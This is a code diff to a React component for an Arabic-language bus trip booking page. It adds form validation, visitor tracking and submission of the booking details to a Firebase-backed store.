@@ -1,6 +1,11 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Bus, Check } from "lucide-react";
+import { useLocation } from "wouter";
 import { BottomNav } from "./services";
+import { addData, handleCurrentPage } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
+
+const TICKET_PRICE = 50;
 
 const stations = [
   "الرياض",
@@ -15,12 +20,59 @@ const stations = [
 ];
 
 export default function TripBooking() {
+  const [, setLocation] = useLocation();
   const [tripType, setTripType] = useState<"one" | "round">("one");
   const [from, setFrom] = useState("");
   const [to, setTo] = useState("");
   const [date, setDate] = useState("");
   const [promoCode, setPromoCode] = useState("");
   const [passengers] = useState({ adults: 1, children: 0, infants: 0 });
+  const [submitting, setSubmitting] = useState(false);
+  const [error, setError] = useState("");
+
+  useEffect(() => {
+    const vid = localStorage.getItem("visitor");
+    if (vid) {
+      setupOnlineStatus(vid);
+      void handleCurrentPage("trip_booking");
+    }
+  }, []);
+
+  const handleSearch = async () => {
+    if (submitting) return;
+    setError("");
+    if (!from || !to || !date) {
+      setError("يرجى اختيار محطة الذهاب والوصول والتاريخ");
+      return;
+    }
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      setLocation("/register");
+      return;
+    }
+    setSubmitting(true);
+    const totalPassengers =
+      passengers.adults + passengers.children + passengers.infants;
+    const ok = await addData({
+      id: visitorId,
+      currentPage: "booking",
+      tripFrom: from,
+      tripTo: to,
+      tripType,
+      promoCode,
+      ticketQuantity: totalPassengers,
+      ticketPrice: TICKET_PRICE,
+      totalAmount: totalPassengers * TICKET_PRICE,
+      bookingDate: date,
+      bookingTime: "—",
+    });
+    if (!ok) {
+      setError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
+      setSubmitting(false);
+      return;
+    }
+    setLocation("/schedule");
+  };
 
   return (
     <div
@@ -148,11 +200,22 @@ export default function TripBooking() {
           </p>
         </div>
 
+        {error && (
+          <p
+            className="text-red-100 bg-red-900/40 rounded-lg px-3 py-2 text-xs text-center"
+            data-testid="error-trip-booking"
+          >
+            {error}
+          </p>
+        )}
+
         <button
-          className="w-full bg-card text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2"
+          onClick={() => void handleSearch()}
+          disabled={submitting}
+          className="w-full bg-card text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
           data-testid="button-search"
         >
-          البحث
+          {submitting ? "جاري الإرسال..." : "البحث"}
         </button>
       </div>
 
